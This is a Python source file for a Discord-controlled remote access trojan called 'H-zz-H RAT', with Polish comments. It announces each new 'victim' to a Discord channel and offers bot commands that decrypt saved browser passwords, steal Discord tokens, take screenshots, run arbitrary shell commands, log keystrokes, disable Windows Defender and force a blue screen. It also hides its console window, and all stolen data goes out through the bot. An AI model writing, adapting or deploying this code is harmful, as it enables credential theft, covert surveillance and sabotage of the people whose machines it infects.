import os
import sys
import getpass
import platform
import subprocess
import requests
import ctypes
from pynput import keyboard as kb
import threading
import sqlite3
import base64
import win32crypt
import time
import json
import re
import shutil
import asyncio
import discord
from discord.ext import commands
from Cryptodome.Cipher import AES
from PIL import ImageGrab
import psutil
import pyautogui
import cv2
import numpy as np
import sounddevice as sd
import wave
import browser_cookie3
from colorama import Fore, init

init()

# Funkcja sprawdzania administratora
def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

# Informacje o systemie
def get_system_info():
    pc_name = platform.node()
    ip_address = requests.get("https://api.ipify.org").text 
    system_version = platform.platform()
    cpu_usage = f"{psutil.cpu_percent()}%"
    ram_usage = f"{psutil.virtual_memory().percent}%"
    disk = psutil.disk_usage('/')
    disk_usage = f"{disk.percent}% used of {disk.total // (1024 ** 3)} GB"
    geolocation = "Unknown"
    try:
        geolocation_data = requests.get("https://ipinfo.io/json").json() 
        geolocation = geolocation_data.get("city", "Unknown")
    except Exception as e:
        pass
    return {
        "PC Name": pc_name,
        "IP Address": ip_address,
        "Geolocation": geolocation,
        "System Version": system_version,
        "CPU Usage": cpu_usage,
        "RAM Usage": ram_usage,
        "Disk Info": disk_usage
    }

# Kradzież haseł z przeglądarki
BROWSERS = {
    "chrome": {
        "path": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "edge": {
        "path": os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "brave": {
        "path": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    }
}

def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = ctypes.WinDLL('crypt32.dll').CryptUnprotectData(
            ctypes.c_char_p(encrypted_key),
            None, None, None, None, 0
        )[1]
        return master_key
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return "Unknown"

def get_browser_passwords(browser_name, data):
    passwords = []
    browser_path = data["path"]
    profile_pattern = data["profiles"]

    if not os.path.exists(browser_path):
        return []

    profiles = [f for f in os.listdir(browser_path) if re.match(profile_pattern, f)]
    for profile in profiles:
        db_path = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_Login_Data.db")
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        master_key = get_master_key(browser_path)
        if not master_key:
            conn.close()
            os.remove(temp_db)
            continue

        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            decrypted_password = decrypt_password(encrypted_password, master_key)

            passwords.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(temp_db)
    return passwords

# Token bota (musisz go zmienić!)
BOT_TOKEN = "TWOJ_TOKEN_BOTA_TUTAJ"

# Intents i bot Discord (w tle)
intents = discord.Intents.default()
intents.message_content = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# Rejestracja kanału dla tej ofiary
async def create_session_channel(guild):
    pc_name = platform.node().replace("\\", "").replace("/", "")
    pc_name = re.sub(r'[^\w]', '', pc_name)
    existing = discord.utils.get(guild.channels, name=pc_name.lower())
    if existing:
        await existing.delete()
    channel = await guild.create_text_channel(pc_name.lower())
    info = get_system_info()
    embed = discord.Embed(title="[H-zz-H] New Victim Connected",
                          description=f"**PC:** {info['PC Name']}\n"
                                       f"**IP:** {info['IP Address']}\n"
                                       f"**Geo:** {info['Geolocation']}\n"
                                       f"**OS:** {info['System Version']}",
                          color=discord.Color.green())
    await channel.send(embed=embed)
    print(f"[+] Session channel '{pc_name}' created.")

@bot.event
async def on_ready():
    print(f"[+] Bot {bot.user} is running in the background.")
    if bot.guilds:
        await create_session_channel(bot.guilds[0])

# Komenda !tokens – kradzież tokenów Discord
@bot.command()
async def tokens(ctx):
    tokens = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    }
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith('.log') or file.endswith('.ldb'):
                try:
                    with open(os.path.join(path, file), errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
                            if match:
                                tokens.extend(match)
                except Exception as e:
                    pass
    if tokens:
        unique_tokens = list(set(tokens))
        embed = discord.Embed(title="🔑 Found Tokens", color=discord.Color.red())
        for token in unique_tokens[:25]:
            embed.add_field(name="Token", value=f"``{token}``", inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="❌ No Tokens Found", description="Could not find any tokens.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Komenda !passwords – kradzież haseł z przeglądarek
@bot.command()
async def passwords(ctx):
    all_passwords = []
    for browser_name, data in BROWSERS.items():
        passwords = get_browser_passwords(browser_name, data)
        all_passwords.extend(passwords)
    if all_passwords:
        output = "**🔐 Saved Passwords:**\n\n"
        for entry in all_passwords:
            output += (
                f"URL: {entry['url']}\n"
                f"Username: {entry['username']}\n"
                f"Password: {entry['password']}\n"
                f"Browser: {entry['browser']} ({entry['profile']})\n"
                f"{'-' * 30}\n"
            )
        await ctx.send(output[:1900])
    else:
        await ctx.send("[+] No passwords found.")

# Komenda !screen – zrzut ekranu
@bot.command()
async def screen(ctx):
    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    img = ImageGrab.grab()
    img.save(screenshot_path)
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)

# Komenda !exec – wykonaj komendę CMD
@bot.command()
async def exec(ctx, *, cmd: str):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    result_str = result.decode('utf-8', errors='ignore')
    if len(result_str) > 1900:
        with open("exec_output.txt", "w") as f:
            f.write(result_str)
        await ctx.send(file=discord.File("exec_output.txt"))
        os.remove("exec_output.txt")
    else:
        await ctx.send(f"```\n{result_str}\n```")

# Komenda !bsod – wywołanie BSOD
@bot.command()
async def bsod(ctx):
    if is_admin():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        await ctx.send("💥 BSOD executed!")
    else:
        await ctx.send("⚠️ Admin rights required!")

# Komenda !disabledefender – wyłączenie Windows Defender
@bot.command()
async def disabledefender(ctx):
    if is_admin():
        os.system("sc stop WinDefend >nul & sc config WinDefend start=disabled >nul")
        await ctx.send("🛡️ Windows Defender disabled!")
    else:
        await ctx.send("⚠️ Admin privileges required!")

# Komenda !keylog_start / stop
key_log = []
keylog_listener = None

def on_press(key):
    global key_log
    key_log.append(str(key))

@bot.command()
async def keylog_start(ctx):
    global keylog_listener
    if keylog_listener is None:
        keylog_listener = kb.Listener(on_press=on_press)
        keylog_listener.start()
        await ctx.send("⌨️ Keylogger started!")

@bot.command()
async def keylog_stop(ctx):
    global keylog_listener, key_log
    if keylog_listener and keylog_listener.is_alive():
        keylog_listener.stop()
        keylog_listener = None
        await ctx.send("🛑 Keylogger stopped.")
        with open("keylog.txt", "w") as f:
            f.write("\n".join(key_log))
        await ctx.send(file=discord.File("keylog.txt"))
        os.remove("keylog.txt")
        key_log.clear()
    else:
        await ctx.send("🛑 Keylogger is not running.")

# Komenda !help – lista komend
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📚 Help Menu", color=discord.Color.blue())
    embed.add_field(name="!tokens", value="Steal Discord tokens", inline=False)
    embed.add_field(name="!passwords", value="Steal saved browser passwords", inline=False)
    embed.add_field(name="!screen", value="Take a screenshot", inline=False)
    embed.add_field(name="!exec", value="Run CMD command", inline=False)
    embed.add_field(name="!disabledefender", value="Disable Windows Defender", inline=False)
    embed.add_field(name="!bsod", value="Trigger Blue Screen Of Death", inline=False)
    embed.add_field(name="!keylog_start/stop", value="Start/stop keylogger", inline=False)
    embed.add_field(name="!reboot", value="Reboot target PC", inline=False)
    embed.add_field(name="!geolocation", value="Get IP location", inline=False)
    await ctx.send(embed=embed)

# Asynchroniczny runner bota
def run_bot():
    bot.run(BOT_TOKEN)

# Symulacja działania RAT-a
def rat_main():
    print("[+] H-zz-H RAT Client Running...")
    while True:
        time.sleep(5)

# Główna funkcja – uruchamia wszystko
if __name__ == "__main__":
    # Ukrycie okna konsoli (opcjonalne)
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Uruchomienie bota w osobnym wątku
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Główne działanie RAT-a
    rat_main()
